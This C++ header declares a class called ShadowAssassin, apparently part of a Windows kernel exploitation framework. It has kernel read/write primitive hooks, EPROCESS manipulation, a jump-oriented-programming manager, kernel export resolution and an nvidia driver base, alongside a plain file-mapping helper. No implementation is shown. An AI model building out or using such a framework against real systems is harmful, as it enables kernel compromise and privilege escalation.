#pragma once
#include "general.h"
#include <functional>
#include "framemanager.h"
#include "jopmanager.h"
#include "offsets.h"

struct ImageMapping {
    HANDLE hFile;
    HANDLE hMap;
    LPVOID view;

    ImageMapping() : hFile(INVALID_HANDLE_VALUE), hMap(nullptr), view(nullptr) {}

    bool Open(const wchar_t* path) {
        hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, nullptr,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) return false;
        hMap = CreateFileMappingW(hFile, nullptr, PAGE_READONLY, 0, 0, nullptr);
        if (!hMap) { CloseHandle(hFile); return false; }
        view = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
        if (!view) { CloseHandle(hMap); CloseHandle(hFile); return false; }
        return true;
    }

    void Close() {
        if (view)  { UnmapViewOfFile(view); view  = nullptr; }
        if (hMap)  { CloseHandle(hMap);     hMap  = nullptr; }
        if (hFile != INVALID_HANDLE_VALUE) { CloseHandle(hFile); hFile = INVALID_HANDLE_VALUE; }
    }
};

class ShadowAssassin
{
private:
    std::function<void(UINT64*, UINT64, UINT64)> readFn;
    std::function<void(UINT64, UINT64)>          writeFn;

    UINT64 scratchAddress;
    UINT64 EPROCESS;

    FrameManager frameManager;
    JOPManager   jopManager;

    UINT64 nvidia_base;
    UINT64 ntso_base;

    UINT64 GetCurrentEPROCESS(UINT64 eprocess);
    UINT64 ResolveKernelExport(const std::string& name);
    UINT64 GetWritableKusd();
    UINT64 GetSectionRva(const ImageMapping& img, const char* sectionName);

public:
    ShadowAssassin();

    void SetReadPrimitive(std::function<void(UINT64*, UINT64, UINT64)> fn);
    void SetWritePrimitive(std::function<void(UINT64, UINT64)> fn);
    void SetScratchAddress(UINT64 addr);
    void SetEPROCESS(UINT64 ep);
    UINT64 Get_System_EPROCESS();

    bool Initialize();

    UINT64 CallSyscall(const std::string& name, const std::vector<UINT64>& params);
    UINT64 GetModuleBaseAddress(const char* targetName);

    FrameManager& GetFrameManager();
    JOPManager&   GetJOPManager();
};
